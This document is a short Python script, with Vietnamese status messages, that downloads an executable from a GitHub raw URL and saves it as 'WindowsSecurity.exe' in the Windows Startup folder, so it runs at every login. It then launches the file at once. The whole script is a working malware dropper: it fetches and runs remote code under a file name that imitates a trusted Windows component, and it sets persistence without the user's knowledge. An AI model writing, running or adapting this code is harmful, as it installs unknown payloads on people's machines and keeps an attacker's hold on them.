
import os
import requests
import subprocess

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
file_name = "WindowsSecurity.exe"
file_path = os.path.join(startup_folder, file_name)

url = "https://github.com/chimtonha/ahgaa/raw/main/codemoidemo.exe"

if not os.path.exists(file_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f"Tập tin {file_name} đã được tải về và lưu tại {file_path}.")
    except Exception as e:
        print(f"Có lỗi xảy ra khi tải tập tin: {e}")
else:
    print(f"Tập tin {file_name} đã tồn tại tại {file_path}.")

# Chạy tập tin
try:
    subprocess.Popen(file_path)
    print(f"Đang chạy {file_name}...")
except Exception as e:
    print(f"Có lỗi xảy ra khi chạy tập tin: {e}")
